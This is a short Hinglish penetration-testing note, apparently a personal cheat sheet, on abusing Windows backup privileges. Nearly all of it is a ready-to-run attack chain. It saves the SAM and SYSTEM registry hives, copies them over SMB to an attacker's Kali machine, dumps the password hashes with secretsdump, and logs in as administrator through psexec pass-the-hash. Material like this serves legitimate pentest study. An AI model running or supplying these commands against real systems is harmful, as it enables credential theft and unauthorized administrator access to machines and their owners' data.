**Concept:**  
Backup ke liye bana tha — taaki admin bina full access ke files backup kar sake. But iska fayda uthake attacker SAM + SYSTEM hives copy kar sakta hai — jisme password hashes hote hain.

**Vulnerability:** SAM + SYSTEM = password hashes. Dono mil gaye → hashes nikalo → PTH karo.

**Commands:**

cmd

```cmd
# Windows pe hives save karo
reg save hklm\sam C:\Users\user\sam.hive
reg save hklm\system C:\Users\user\system.hive

# Kali pe SMB server banao
python3 smbserver.py -smb2support -username user -password pass public share

# Windows se Kali pe transfer karo
copy sam.hive \\KALI_IP\public\
copy system.hive \\KALI_IP\public\

# Kali pe hashes dump karo
python3 secretsdump.py -sam sam.hive -system system.hive LOCAL

# PTH se login karo
python3 psexec.py -hashes <lmhash>:<ntlmhash> administrator@<IP>
```